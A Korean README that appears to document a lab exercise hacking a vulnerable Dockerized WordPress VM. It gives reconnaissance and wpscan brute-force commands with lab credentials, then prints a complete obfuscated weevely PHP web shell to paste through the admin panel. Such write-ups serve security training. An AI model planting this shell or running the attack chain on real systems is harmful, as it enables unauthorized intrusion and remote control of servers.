![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/13f1f546-cc3c-4287-8bca-252a673443b8)
## Docker_WP_Hacking
도커 환경으로 구성한 워드프레스를 도커 취약점과 워드프레스 취약점을 이용해 해킹해보기.

## 사전준비
- 취약한 도커 이미지를 가상화 툴에 올려 준비해준다. : 192.168.146.129
- Kali Linux : 192.168.146.128
- WireShark
- Burpsuite (Decoder용도)

## 정보수집
- nmap을 통한 포트 스캔
```
sudo nmap -sV 192.168.146.129 -p-
sudo nmap -sV -sC 192.168.146.129 -p-
```

> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/0a64950c-3f19-472f-8145-93b562db515d)
> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/11b8c2fe-2e10-4cc5-81fc-26bbdedfbe16)
- /wp-admin/ 경로 정보 획득
> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/c2041775-4ecb-4186-9f02-771b675487ba)
- 8000 포트, 22번 포트 확인
> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/31d1c0dd-a66d-45b1-9984-02de893825bd)

- Nikto를 통한 정보 수집
```
sudo nikto -h http://192.168.146.129:8000/
```

> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/3cf75a46-568c-4f8c-8a2c-03bb9e1f6862)

- dirb를 통한 정보 수집
```
sudo dirb http://192.168.146.129:8000/
```
> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/170e296e-7298-4bb8-9ec1-25f0e5df1b61)

- wpscan을 통한 정보(워드프레스 플러그인 취약점) 수집
```
wpscan --url http://192.168.146.129:8000/ --enumerate p
```

> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/7979d634-5639-49df-8567-7f1fa200fac6)
> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/71539c00-8342-4b39-9c93-4b868c99b1f9)
- 메시지를 읽어보니 POST 메소드는 허용하는 것으로보아 무차별 대입공격을 허용하는 것 같다.

## brute-force 공격

-wpscan을 이용해 wordpress 계정 정보 얻기

```
wpscan --url http://192.168.146.129:8000/ --enumerate u
```

> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/b61fb484-9230-47ca-a415-76c5c4c09b5e)

- wpscan의 무차별 대입 공격 기능 사용
- github SecList의 password 모음을 사용.

```
sudo git clone https://github.com/danielmiessler/SecLists.git
sudo wpscan --url http://192.168.146.129:8000/ --passwords ~/SecLists/Passwords/Common-Credential/10-million-password-list-top-10000.txt --usernames bob
```

> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/80b80b6e-0292-4a3d-9b38-67e3c97675a0)
> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/210c83da-95ac-42e7-b7d8-c04bbb289f9c)

## 웹쉘 생성
- weevly를 사용하여 웹쉘 생성
```
sudo weevely generate hacker shell.php
cat shell.php
```

> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/466ade39-1490-4a56-b3d7-ad1a12b9d5aa)

## 웹쉘 코드 업로드
- [wordpress admin site] -> [login(bob/Welcome1)] -> 
> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/1db97540-a895-4d8f-915c-5c291598a904)

```
?>
<?php
$B=str_replace('WQ','','cWQreatWQWQe_fWQuncWQtWQion');
$Z='$ku2="du26a6bc0d";$u2khu2="b10694a2du290e";$kf="u23a6964u28u2f3a03";$p=u2"g7e6u2hLIPrmHu2v7eIu2ju2";fun';
$l='u2val(@gzuncomu2pru2ess(@x(u2@base6u24_decode($m[1])u2,$k)))u2;$ou2=@ou2b_get_cou2ntentu2s();@obu2';
$A='u2"/$kh(.u2+)u2$kf/",@file_u2get_cu2ou2ntents(u2"php://inpu2uu2t"),u2$m)==1)u2 {@ob_u2su2tart();@e';
$h='2u2u2($j<$c&&$u2i<$l);$j++,u2$i++u2){u2$o.=$t{$iu2}^u2$k{$j}u2;}}returnu2 u2$o;}if (@preg_mau2tch(';
$d='_endu2u2_cleanu2();$r=u2@bu2ase64_encode(@u2x(@gu2zcompress($u2u2o),$k))u2;pu2rint("$p$kh$r$kf");}';
$G='cu2tion x($t,$k){$u2c=stru2len($ku2);$lu2u2=strlen($tu2)u2;$o="";for(u2$i=u20;$i<$l;){fu2or($j=0;u';
$k=str_replace('u2','',$Z.$G.$h.$A.$l.$d);
$C=$B('',$k);$C();
?>
<?php

```

